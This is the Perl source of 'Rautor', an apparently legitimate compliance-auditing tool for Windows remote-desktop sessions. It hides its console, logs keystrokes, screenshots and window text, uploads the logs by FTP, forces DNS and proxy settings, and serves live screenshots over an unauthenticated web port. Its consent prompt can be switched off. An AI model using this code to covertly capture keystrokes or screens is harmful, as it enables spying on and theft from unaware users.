#!perl.exe -w

###########################################################################################
# S.Ox. /pci compliance for rdesktop users 
# Angelos Karageorgiou angelos@unix.gr Nov 2007 
# Major Rework Fall 2009
# Save pngs of screen shots, text contents of well behaved windows,
# and keyboard logging under c:\Audit
# Fully configurable via RRS.PL 
# 
# Released under the GPLv2 VERSION oh what can I say , 1.7 sounds good
#
# Get Brian H Oak's http://www.acornnetsec.com/perl/msg.dll for proper windows reporting
###########################################################################################



package Rautor;

use common::sense;
use threads;
use threads::shared;
use Thread::Queue;
use POSIX qw(strftime);
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI::DIBitmap;
use Win32::EventLog;
use Win32::ShutDown;
use Win32::OLE qw (in);
use Win32::ShutDown;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Win32::TieRegistry ( Delimiter=>'/');
# for FIle uploading
use Net::FTP;
use File::Find ();
# for the convenience of &wanted calls, including -eval statements:
use vars qw/*name *dir *prune/;
*name   = *File::Find::name;
*dir    = *File::Find::dir;
*prune  = *File::Find::prune;
use HTTP::Daemon;
use HTTP::Response;
use HTTP::Status;
$HTTP::Daemon::PROTO = "HTTP/1.0";
my $RepeatHTML=undef;



#threads
our $RAUTORACTIVE:shared=1;
my $mainprog=undef;
my $uploader=undef;


BEGIN {
 my ($DOS) = Win32::GUI::GetPerlWindow();
 if ( $DOS ) {
    Win32::GUI::Hide($DOS) unless ($ARGV[0] eq '--keep');
 } else {
	$SIG{INT} = \&doAbEnd;    
	$SIG{TERM} = \&doAbEnd;
 }
# hide child windows
 if ( defined &Win32::SetChildShowWindow ){
	Win32::SetChildShowWindow(0);
  }
}

# Licensing
my  $DOMAIN="UNIX.GR";
our $DECSN="";
our $STARTYEAR=2009;
our $ENDYEAR=2009;
our $ENDMONTH=12;

my  $AUTHOR="Angelos Karageorgiou http://www.unix.gr";
our $DRIVE="C:";
our $AUDITDIR="Audit"; 	
our $FTPSERVER=undef;
our $FTPUSER=undef;
our $FTPPASS=undef;
our $KEEPFILES:shared=1;
my  $DEFSLEEP=3;		#seconds
our $SLEEP=$DEFSLEEP; 		
my  $DEFQUAN=130;	#milisecs that sleep time is broken into quanta :-)
our $QUANTUM=$DEFQUAN; 
our @WINDOWSNAMES=( "Internet Explorer", "Live Messenger",
	"Firefox", "Microsoft Outlook", "Inbox" );

our $TRIGGER=1;
our $OPENDNS=0;
my  $OpenDNSNameServers="208.67.222.222 208.67.220.220";
our $DIRECTSITES="127.0.0.1;<local>;*.unix.gr";
our $PROXY=undef;
our $PROXYSERVER=undef;
our $PROXYPORT=undef;
our $LICENSE="";
our $DEMO=0;
my  $INDEMO=0;
our $KEYLOGGER=1;
our $SCREENDUMPER=1;
our $SCREENSCRAPER=1;
our $PROXYLOCK=0;
our $FULLSCRAPE=1;
our $VERBOSE=0;
our $LEGALWARNING=1;
our $DEBUG=0;
our $MYNAME="Rautor";
my  $DOFTP=0;
my  $KFNAME="";
my  $LOGFNAME="";
my  $tmpKFNAME="";
our $MSGDLLPATH="C:\\Rautor\\msg.dll";
our $TRAYICON=0;
our $WEBSERVER=0;
our $WEBPORT=2222;
my  $WEB=undef;
my  $LASTIMAGE="$ENV{APPDATA}\\screen.png";
our $UPLOADOLDFILES=0;


############# Load our modules ############
our %keymap;
require "keymap.pl";		# Virtual to real keys translator
require "Rreg.pl";		# registry stuff , common with rrs.pl
require "Rau_init.pl";		# Intializing 
###########################################


# stub main function :-) sub Main()
###########################################
# here starts the fun
&initEventLog();

# get the user and system data
our  $user=Win32::LoginName();
our  $Node=Win32::NodeName();
our  $domain=Win32::DomainName();
$domain=~ s/\./8/;

&doRegistry();

if ( $OPENDNS == 1 ) {
	&doOPENDNS();
}


our  $path=initPaths($Node);


$KFNAME=$path ."\\KeyBoard_Log.txt";
$LOGFNAME=$path ."\\Session_Log.txt";
share($LOGFNAME);
$tmpKFNAME=$path ."\\KeyLogtmpCopy.txt";

# display errors on console if run from console with --keep
&initDebug() unless ($ARGV[0] eq '--keep');

if ( $LEGALWARNING == 1 ) {
	my $string="Your session will be logged, click on YES if you agree";
	my $ret=Win32::MsgBox($string, 4|MB_ICONSTOP, "$MYNAME");
	if ( $ret != 6 ) {
		&doEnd();
	}
}

# why am I using GetDesktopWindow vs GetDC ?
# Ok I will use both !
my $GetDC = new Win32::API('user32','GetDC',['N'],'N');
my $DC  = $GetDC->Call(0);
my $ReleaseDC = new Win32::API('user32', 'ReleaseDC',    [qw/N N/], 'I');
my $GetDesktopWindow = new Win32::API('user32','GetDesktopWindow', [], 'N');
my $DESKTOP:shared = $GetDesktopWindow->Call();

if ( ( $QUANTUM <=0 ) || ( $QUANTUM > 1000 ) ) {
	$QUANTUM=$DEFQUAN;
	&mylog(200,"Warning:Invalid QUANTUM, value reset to $DEFQUAN millisecs");
}
if  ( $SLEEP <=0 ) {
	$SLEEP=$DEFSLEEP;
	&mylog(200,"Warning:Invalid SLEEP, value reset to $DEFSLEEP seconds");
}

our  $FTPQueue = Thread::Queue->new();
$DOFTP=initFTPstuff();
if ( $DOFTP ) {
	print STDERR "Going to create uploader\n";
       	# this following motherfucking stanza must be in the main function or else thread is never initialized
	$uploader = threads->create('uploadFilesThread',$FTPSERVER,$FTPUSER,$FTPPASS);
	if ( ! $uploader ) {
		mylog(300,"Error:Ftp uploading thread cannot be initialized");
		$DOFTP=0;
	} 
	$uploader->detach();
	mylog(100,"Info:Ftp uploading thread detached");
	if ( $UPLOADOLDFILES ) {
		&FindLeftOvers($DRIVE."\\".$AUDITDIR);
	}
}


if ( $WEBSERVER) {
	print STDERR  "Trying to create Web Server thread\n" if ( $DEBUG);
       	# this following motherfucking stanza must be in the main function or else thread is never initialized
	$WEB = threads->create('Rautor_Web',$DESKTOP,$DC);
	if ( ! $WEB ) {
		mylog(300,"Error:Web Server thread cannot be initialized");
		print STDERR "Web server could not be started\n" if ( $DEBUG);
	}  else {
		$WEB->detach();
		mylog(100,"Info:Web Server Thread detached");
		print STDERR "Web server started\n" if ( $DEBUG);
	}
} else {
	mylog(100,"No Web Server configured");
	print STDERR  "No Web Server configured\n" if ( $DEBUG);
}

#
# And a bit of GUI :-)
#

my $main = Win32::GUI::Window->new(
	-name   => 'Rautor Status',
	-width  => 100,
	-height => 100,
	-minsize => [100, 100],
  	-visible => 0, 
);



if ( $TRAYICON == 1 ) {
    my $ICONPATH="bull.ico";

	#snippet shamelessly stolen from splashscreen.pm
	my @dirs;
	# directory of perl script
	my $tmp = $0; $tmp =~ s/[^\/\\]*$//;
	push @dirs, $tmp;
	# cwd
	push @dirs, ".";
	push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
	push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

	for my $dir (@dirs) {
		next unless -d $dir;
		print STDERR "Attempting to locate icon $dir\n" if $DEBUG;
		if ( -f "$dir\\bull.ico" ) {
			$ICONPATH=$dir ."\\bull.ico";
		}
	}



    my $Icon = new Win32::GUI::Icon($ICONPATH);

    my $trayIcon = $main->AddNotifyIcon(
	-name => "BULL",
        -icon => $Icon,
        -tip => $MYNAME,
    );
    $main->Enable();

	$mainprog = threads->create('Rautor');
	if ( ! $mainprog ) {
		mylog(300,"Error:Rautor cannot start");
		&doEnd();
	} 
	$mainprog->detach();
	
	Win32::GUI::Dialog();
} else {
	&Rautor();
	&doEnd();
}

1; # I am reely nice


######################################################################
# Main Code
######################################################################


sub Rautor{
sleep(2); # just a bit of time for the dust to settle down;

my $RautorMSG="Rautor is Auditing";
my  $thread=Win32::GetCurrentThreadId();

while  ( ($RAUTORACTIVE==1) && 
	  ($thread == Win32::GetCurrentThreadId() )
	) { #  or you can say while($Forever)

	# read dynamic registry settings, not everything is
	&ReadRegistry();

	# do we force the opends name servers ?
	if ( $OPENDNS >= 1 ) {
		&doOPENDNS();
	}
	# force a proxy
	if ( $PROXYLOCK==1  ) {
		&setProxy();
	}

	# should we trigger at all?
	if (  $TRIGGER <= 0  ) {
		if ( $TRAYICON == 1 ) {
			$main->BULL->Change(-tip=>"Rautor is Inactive");
		}
        	threads->yield();
		Win32::Sleep(1000); # we can be triggered any second
		next;
	}

	my $msg=undef;
	my $didIlog=0;
	my $now_string = strftime "%Y%m%d-%H%M%S", localtime;
	my $day_string = strftime "%Y%m%d", localtime;
	my $spinname =   sprintf("%s\\%s.png", $path,$now_string);
	my $keyspinname =sprintf("%s\\%s-KeyboardLog.txt", $path,$now_string);
	my $tname =      sprintf("%s\\%s-ScreenContents.txt", $path,$now_string);


	# should we trigger for certain windows' names ?
	if  ( $#WINDOWSNAMES >= 0 ) {
		if ( locateWindows(@WINDOWSNAMES) <= 0 ){
			if ( $TRAYICON==1) {
				$main->BULL->Change(-tip=>"Rautor: No window found to Trigger");
			}
			mylog(200,"Warning:No window found for activating $MYNAME") if ( $VERBOSE);
			print STDERR "No window found for activating $MYNAME" . "\n" if ($DEBUG);
			Win32::Sleep($SLEEP*1000);		# we should not trigger at all !
			next;
		} else {
			$RautorMSG="Rautor: Triggered for some windows";
		}
	} else {
		$RautorMSG="Rautor: Active";
	}
	if ( $TRAYICON == 1 ) {
		$main->BULL->Change(-tip=>$RautorMSG);
	}
	
	# First try the keyboard logger
	if ( $KEYLOGGER>=1 ) {
		$didIlog=KeyLogger($SLEEP,$QUANTUM,$keyspinname);
		# dump keylogfile into big key log file
		open (my $smallLog,"<$keyspinname") || mylog(500,"Error:Small Keyboard log open failed");
		open (my $bigLog,">>$KFNAME") || mylog(500,"Error:Large Keyboard log open for append failed");
		if ( $smallLog && $bigLog ) {
			while (<$smallLog>) {
				print $bigLog $_;
			}
			close ($smallLog);
			close($bigLog);
			if ( $DOFTP) {
				$FTPQueue->enqueue($keyspinname.",".$KEEPFILES);
			}	
		}
	}	
	# now try to grab a screen image
	if ( $SCREENDUMPER>=1){
		&screendumper($spinname,$DESKTOP,$DC);
	}

	if ( $SCREENSCRAPER >=1 ) {
		&DumpAnyText($tname); # from well behaved windows components
	}


        if (	($KEYLOGGER != 1)  ||
		( ( $KEYLOGGER==1 ) && ($didIlog==-1) ) 
	    ){
		Win32::Sleep($SLEEP*1000); # the keylogger exited immediately , so sleep a bit
	} else {
		if ( $DOFTP ) {
			Win32::CopyFile($KFNAME, $tmpKFNAME, 1) ;
			$FTPQueue->enqueue($tmpKFNAME.",".$KEEPFILES); 
		}
	}

        threads->yield();
 } 


} # end Main_Program

######################################################################
# End Main Code
######################################################################



############# End of execution section ############
###################################################
END {
	&doEnd();
}

sub doEnd{
	if ( ! $user ) { $user = "unknown !"}
	mylog(100,"Info:Program Terminating for user ".$user);
	&getout();
}

sub doAbEnd{
	&mylog(500,"Error:hmmm, seems like somebody killed this process before a proper logout");
	&getout();
}
# from the GUI stuff
sub main_Terminate {
	&doEnd();
}
############################################################

sub getout{
	$ReleaseDC->Call(0,$DC);
	$RAUTORACTIVE=0;
	if ( -f $KFNAME ) {
		if ( $DOFTP ) {
			&uploadKeylog($KFNAME);
			$FTPQueue->enqueue($KFNAME.",".$KEEPFILES); 
			sleep(10); #give FTP some time to complete;
		}
	}
    # now that is a beauty
    # unregister the message DLL
    my $welkey =  $Registry->{ "LMachine/System/CurrentControlSet/Services/EventLog/" };
    my $logkey =  $welkey->{ "Application/" };
    delete $logkey->{ "$MYNAME/" }  || mylog(500,$^E);
    if ( ! $DEBUG ){
    	Win32::ShutDown::ForceLogOff();
    }
    exit;
}



############# Screen Scraper Section ################
#####################################################

sub DumpAnyText{
	my $filename=shift;
	open(LOGFILE,">$filename") || return; # otherwise it has no meaning
	
	my @hwnds = FindWindowLike();     
	my $oldtext="";
	foreach my $window (@hwnds) {
		if (
		       	( ! $FULLSCRAPE ) && 
			( ! IsWindowVisible($window) )
	       	   ) {
				next;
		}
		## if fullscrape or windows is visible
		my $title=GetWindowText($window);
		chomp($title) if ( $title =~ /\n$/);
		chomp($title) if ( $title =~ /\r$/);
		next if ($title eq '');
		next if ( $title =~ /WMS ST Notif Window/ );
		$title=~s/\x0// ;
		$title=~s/[\r\n]$// ;
		next if ( $title =~ /^$/);
		print STDERR "[$title]\n" if ( $DEBUG);
		print LOGFILE "[$title]\n";
	
		my @edits=FindWindowLike($window,"","");
		foreach my $ed (@edits) {
			my $text=" " x 65536;
			$text=GetWhatYoucan($ed);
			$text=~s/\x00/ / ;
			$text=~s/[\r\n]$// ;
			next if ($text =~ /^$/ );
			next if ($text eq $oldtext);	# skip duplicates
			$oldtext=$text;
			print STDERR "\t". $text ."\n"  if ( $DEBUG);
			print LOGFILE "\t". $text ."\n";
		}
		print STDERR "\n" if ( $DEBUG);
		print LOGFILE "\n";
	}
	close(LOGFILE);
	if ( $DOFTP) {
		$FTPQueue->enqueue($filename.",".$KEEPFILES);
	}
}


######################################################################
sub GetWhatYoucan{
	my $ed=shift;

	my $text="";
    	eval {
       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
       		alarm 1;
		$text=WMGetText($ed);
       		alarm 0;
    	};
    	if ($@) {
		return undef;
    	}
	return $text;
}

###################### Logging Section #######################
##############################################################
sub LogWin32Event {
    my $eventid    =  shift( @_ );
    my $logmessage =  shift( @_ );
    
    my $eventtype  =  Win32::EventLog::EVENTLOG_INFORMATION_TYPE(); # default
       $eventtype  =  Win32::EventLog::EVENTLOG_WARNING_TYPE() if $logmessage =~ /^w\S+:/i;
       $eventtype  =  Win32::EventLog::EVENTLOG_ERROR_TYPE()   if $logmessage =~ /^e\S+:/i;
       $logmessage    =~ s/^\S+:\s*//;
    
    my $EVT        =  Win32::EventLog->new( "Application",$Node);
    if ( $EVT) {
    	$EVT->Report({
        	Source                 => $MYNAME,
        	EventType              => $eventtype,
        	Category               => 300,
        	EventID                => $eventid,
        	Strings                => $logmessage,
        	Data                   => "",
    	});
     }
}
######################################################################

sub mylog{
	my $eventid=shift;
	my $strings=shift;

	print STDERR $strings. "\n" if ($DEBUG);
	LogWin32Event($eventid,$strings);

	my $now = strftime "%Y%m%d-%H%M%S:", localtime;	
	open (LOG,">>$LOGFNAME") || return;
	print LOG  $now . $strings . "\n";
	close(LOG);
	if ( $DEBUG ) {
		print STDERR  $now . $strings . "\n";
	}
}



#################### Triggering Section ######################
##############################################################
sub locateWindows{
	my @WINDOWSNAMES=@_;
	my $foundawin=0;

	my @hwnds = FindWindowLike();     
	foreach my $window (@hwnds) {
		my $title=GetWindowText($window);
		next if ( $title eq "");
		foreach my $name (@WINDOWSNAMES) {
			if ( $title =~ /$name/gi){
				print STDERR " ***** $name $title *****  found window \n";
				$foundawin++ ;
			}
		}
	}

	return($foundawin);
}

######################## FTP section ( uploading ###########
############################################################

sub ThreadLog{
	my $strings=shift;

	my $now = strftime "%Y%m%d-%H%M%S:", localtime;	
	open (my $LOG,">>THREADS_".$LOGFNAME) || return;
	print $LOG  $now . $strings . "\n";
	close($LOG);
}

######################################################################

sub uploadFilesThread {
my  ($FTPSERVER,$FTPUSER,$FTPPASS)=@_;
my  $Node=Win32::NodeName();

  while ( $RAUTORACTIVE==1) {
	my $tmp=$FTPQueue->dequeue() ;
	my ( $filename,$KEEPFILES)=split(',',$tmp);
        ThreadLog("Info:File to upload $filename");
	print STDERR "FTP:File to upload $filename\n"  if ( $DEBUG);
        my @felems=split(/[\\\/]/,$filename);
        my $fname=$felems[$#felems];
        my $dirname=$felems[$#felems-1];

	my $start=0;
	if ( $felems[0] =~ /\:/ ) {
		$start=1;
	}
	my $j;
#	my @DirStructure=($Node,); is this nice to have the logs by machine name ?
	my @DirStructure=();
	for ($j=$start;$j<$#felems;$j++){
		push (@DirStructure,$felems[$j]);
	}

        # log in each time, the net is a finnicky place
        my $ftp = Net::FTP->new($FTPSERVER, 
				Timeout => 5,
				Passive => 1,
				Debug => $VERBOSE,
				);
	if ( ! $ftp ) {
          ThreadLog("Error:FTP init failed");
          return;
	}


        if ( ! $ftp->login($FTPUSER,$FTPPASS) ) {
          ThreadLog("Error:FTP credentials Wrong");
          return;
        }

	if ( $filename =~ /\.png$/){
        	$ftp->binary() ;
	}else {
		$ftp->ascii();
	}

#	run down  and create the path
	my $subdir="";
	foreach $subdir (@DirStructure) {
	        if( ! $ftp->cwd($subdir) ){
			$ftp->mkdir($subdir);
        		$ftp->cwd($subdir);
        	}
	}
        if ( ! $ftp->put($filename) ) {
                ThreadLog("Error:File $filename failed to upload");
        } else {
                ThreadLog("Info:File $filename uploaded under $dirname\/$fname") if ( $VERBOSE );
	}
        $ftp->quit;
        unlink $filename if ( $KEEPFILES==0 ) ;
        threads->yield();
   }
}


######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
sub KeyLogger{
	my  ($SLEEP,$QUANTUM,$KFNAME)=@_;
	my  $KEYLF=undef;
	my  $spins=($SLEEP*1000)/$QUANTUM; # so many spins per sleep period

	open($KEYLF,">$KFNAME");
        if ( ! $KEYLF ) {
		mylog(300,"Error:Cannot create Key Log file " . $KFNAME . " KeyLogger Inoperable");
		return(-1);
        }
	my $now = strftime "\n%Y%m%d-%H%M%S:", localtime;
	print $KEYLF $now;
	
	for ( my $s=0;$s<$spins;$s++){ 
 		for ( my $i=0; $i<255;$i++){
 			if (IsKeyPressed($i)){
				if ( length( $keymap{$i}) ==1  ) {
					print $KEYLF $keymap{$i};
				} else {
					print $KEYLF  " [" . $keymap{$i} . "]" ;
				}
				my $now = strftime "\n%Y%m%d-%H%M%S:", localtime;
				if ($i == 0x0D)	{
					print $KEYLF $now;
				} # ENTER was pressed
			}
		}
		Win32::Sleep($QUANTUM);
	}
	close($KEYLF);
}



#################### ScreenDumper Section ##################
############################################################
sub screendumper{
my  ( $spinname,$DESKTOP,$DC)=@_;
my $image=undef;
my $msg="";

	if ( $DC ) {
		$image = newFromDC Win32::GUI::DIBitmap($DC) ;
	} else {
		$image = newFromWindow Win32::GUI::DIBitmap($DESKTOP,0) ;
	}

	if ( ! $image) {
		$msg="No snapshot taken! No Desktop window ? What gives ?" ;
		mylog(200,"Warning:"+$msg);
		return -1;
	}

	my $bits=$image->GetBPP();
	if ( $bits > 16 ) {
		$image->ConvertTo16Bits565();
	}
	$image->SaveToFile($spinname)|| mylog(300,"Errro:Could not save screen". $spinname);
	# for the web server;
	$image->SaveToFile($LASTIMAGE) || mylog(300,"Errro:Could not save screen". $LASTIMAGE);
	if ($DOFTP ) {
		$FTPQueue->enqueue($spinname.",".$KEEPFILES); 
	}
	$msg="Snapshot->" . $spinname;
	mylog(100,"Info:".$msg) if ( $VERBOSE);
	print STDERR $msg . "\n" if ($DEBUG);
	return;
}




####################### Enforcers Section ##################
############################################################
sub doOPENDNS{
    my $rkey=$Registry->
    	{"LMachine/SYSTEM/CurrentControlSet/"}->
    			{"Services/Tcpip/Parameters/"};

    if ( ! $rkey ) {
	    mylog(300,"Cannot read DNS settings from Registry");
	    return
    }
	# are they dhcp assigned ?
	if (defined($rkey->{'DHCPNAMESERVER'})) {
             $rkey->{'DHCPNAMESERVER'}=$OpenDNSNameServers;
	}
	# force this in any case
        $rkey->{'NAMESERVER'}=$OpenDNSNameServers;

	undef $rkey;
}



######################################################################
# this code I stole from ssloyd from perlmonks to force the browser's proxy
#
###############
sub strip{
    #usage: $str=strip($str);
    #info: strips off beginning and endings returns, newlines, tabs, and spaces
    my $str=shift;
    if(length($str)==0) { return ; }

    $str=~s/^[\r\n\s\t]+//s;
    $str=~s/[\r\n\s\t]+$//s;

    return $str;
}

sub setProxy{
    #Set access to use proxy server (IE)
    #http://nscsysop.hypermart.net/setproxy.html
   
    my $enable=1; 
    my ( $server,$port)=split(/:/,$PROXY);

    if (
	    ( ! defined($server) ) || ( ! defined($port) ) 
    ) {
	    	return;
    }
    my $override=$DIRECTSITES;
    if (! defined ($override ) ) {
	    $override="127.0.0.1;<local>";
    }

    #set IE Proxy

    my $rkey=$Registry->{"CUser/Software/Microsoft/Windows/CurrentVersion/Internet Settings"};
    $rkey->SetValue( "ProxyServer"   , "$server\:$port"  , "REG_SZ"    );
    $rkey->SetValue( "ProxyEnable"   , pack("L",$enable) , "REG_DWORD" );
    $rkey->SetValue( "ProxyOverride" , $override         , "REG_SZ"  );


    #Change prefs.js file for mozilla
    #http://www.mozilla.org/support/firefox/edit
    if(-d "$ENV{APPDATA}\\Mozilla\\Firefox\\Profiles"){
        my $mozdir="$ENV{APPDATA}\\Mozilla\\Firefox\\Profiles";
        opendir(DIR,$mozdir) || return "opendir Error: $!";
        my @pdirs=grep(/\w/,readdir(DIR));
        close(DIR);
        foreach my $pdir (@pdirs){
            next if !-d "$mozdir\\$pdir";
            next if $pdir !~/\.default$/is;
            my @lines=();
            my %Prefs=(
                 "network\.proxy\.http" => "\"$server\"",
                 "network\.proxy\.http_port" => $port,
                 "network\.proxy\.type" => $enable,
                );
            if(open(FH,"$mozdir\\$pdir\\prefs.js")){
                @lines=<FH>;
                close(FH);
                my $cnt=@lines;
                #Remove existing proxy settings
                for(my $x=0;$x<$cnt;$x++){
                    my $line=strip($lines[$x]);
                    next if $line !~/^user_pref/is;
                    foreach my $key (%Prefs){
                        if($line=~/\"$key\"/is){
                            delete($lines[$x]);
                                  }
                             }
                        }
                   }
            if(open(FH,">$mozdir\\$pdir\\prefs.js")){
            binmode(FH);
            foreach my $line (@lines){
                $line=strip($line);
                   print FH "$line\r\n";
                  }
            foreach my $key (sort(keys(%Prefs))){
                print FH qq|user_pref("$key",$Prefs{$key});\r\n|;
                }
            close(FH);
            }
           }
         }

	#Change operaprefs.ini file
	# this modification is mine
    if(-d "$ENV{APPDATA}\\Opera\\Opera"){
            my @lines=();
	    $override=~s/;/,/g;
            my %Prefs=(
		"Use Automatic Proxy Configuration" => 0,
		"HTTP server" => $server . ":" . $port,
		"HTTPS server" =>  $server . ":" . $port,
		"FTP server" => $server . ":" . $port,
		"Gopher server" => $server . ":" . $port,
		"WAIS server" => $server . ":" . $port,
		"Automatic Proxy Configuration URL" => "",
		"No Proxy Servers" => $override,
		"No Proxy Servers Check" => 1,
		"Use HTTP" => 1,
		"Use HTTPS" => 1,
		"Use GOPHER" => 1,
		"Use WAIS" => 1,
		"Use FTP" => 1,
		"Enable HTTP 1.1 for proxy" => 1,
            );

	    # delete settings if exist
            if(open(FH,"$ENV{APPDATA}\\Opera\\Opera\\operaprefs.ini")){
                @lines=<FH>;
                close(FH);
                my $cnt=@lines;
                #change existing proxy settings
                for(my $x=0;$x<$cnt;$x++){
                    my $line=strip($lines[$x]);
                    foreach my $key (keys %Prefs){
                        if($line=~/^$key/is){
                            delete($lines[$x]);
                        }
                     }
                }
            }
            if(open(FH,">$ENV{APPDATA}\\Opera\\Opera\\operaprefs.ini")){
              binmode(FH);
              foreach my $line (@lines){
                $line=strip($line);
                   print FH "$line\r\n";
		   if ( $line =~ /^\[Proxy\]/) {
                    foreach my $key (keys %Prefs){
			    print FH $key . "=" . $Prefs{$key} . "\r\n";
                  }
                }
	      }
            }
            close(FH);
      }
}


#################### Left Overs Section ###############
#######################################################
# these are our file extensions
sub wanted {
  if ( ( /^.*\.txt\z/s )  ||  ( /^.*\.png\z/s ) ){
   	print STDERR ("Left over file found:$name\n") if ( $DEBUG);
	$FTPQueue->enqueue($name.",".$KEEPFILES);
   }
}


#
# Find any old audit files and queue them up for upload!
#
sub FindLeftOvers {
	my $LOpath=shift;
	# Traverse desired filesystems
	File::Find::find({wanted => \&wanted}, $LOpath);
}

#########################     Rautor Web   ###########################
######################################################################

sub Rautor_Web {
	my ( $DESKTOP,$DC)=@_;
	my $daemon = HTTP::Daemon->new(Listen=>10,LocalPort=>$WEBPORT,ReuseAddr=>1);
	if ( ! $daemon ) {
		print "Could not create deamon\n";
		return -1;
	}
	print STDERR  "Web server URL:", $daemon->url,"/screen.png" if ( $DEBUG);

	$RepeatHTML="<HEAD><META HTTP-EQUIV=REFRESH CONTENT=3></HEAD>
               <img src=\"" .$daemon->url. "screen.png\"" .">";

  while (my $connection = $daemon->accept) {
	my $receiver = $connection->get_request;
	if (! ($receiver->method eq 'GET') ){
       		$connection->send_error(RC_FORBIDDEN);
	}	 
       	elsif  ($receiver->url->path eq "/screen.png" ) {
		if ( ! -f $LASTIMAGE) { # is the screendumper code running ?
			&screendumper( $LASTIMAGE,$DESKTOP,$DC);
		}
		if (-f $LASTIMAGE) {
       			my $response = HTTP::Response->new(200);
       			$response->push_header('Content-Type','image/png');
			$connection->send_response($response);
			$connection->send_file($LASTIMAGE);
			unlink $LASTIMAGE;
		} else {
          		$connection->send_error(404,"No Last Screen Capture");
		}
	}
       	elsif  ($receiver->url->path eq "/monitor" ) {
       		my $response = HTTP::Response->new(200);
      		$response->content($RepeatHTML);
		$connection->send_response($response);	
	}
	# all else fails
	else {
		$connection->send_error(RC_FORBIDDEN);
	}
	close($connection);
	undef ($connection);
	threads->yield();
	}
   return(1); #impossible
}


######################################################################
#  End of Everything
######################################################################
